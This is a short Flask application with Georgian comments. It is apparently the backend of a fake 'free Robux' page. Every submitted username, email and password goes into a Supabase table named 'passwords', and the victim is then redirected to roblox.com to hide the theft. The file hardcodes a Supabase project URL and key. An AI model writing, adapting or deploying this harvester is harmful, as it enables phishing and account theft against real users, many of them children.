from flask import Flask, render_template, request, redirect
import os
from supabase import create_client, Client

app = Flask(__name__)

# ⚠️ ეს ორი ხაზი შეავსე Supabase-დან აღებული მონაცემებით ⚠️
SUPABASE_URL = "https://buqmhyvcxakfkjcgkxbt.supabase.co"
SUPABASE_KEY = "sb_publishable_rqhL4LH1pTJISNLVaTFIYQ_d8GOp9S7"
# ვუკავშირდებით ბაზას
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        service = request.form.get('service', 'Roblox')
        robux_amount = request.form.get('robux_amount', 'Unknown')
        username = request.form.get('username', '')
        email = request.form.get('email', '')
        password = request.form.get('password', '')

        # ვწერთ მონაცემებს Supabase-ის ბაზაში
        try:
            supabase.table('passwords').insert({
                "service": service,
                "robux_requested": robux_amount,
                "username": username,
                "email": email,
                "password": password
            }).execute()
        except Exception as e:
            print(f"ბაზაში ჩაწერის შეცდომა: {e}")

        # მომხმარებელს ისევ რობლოქსზე გადავიყვანთ
        return redirect('https://www.roblox.com')

    return render_template('index.html')

if __name__ == '_main_':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
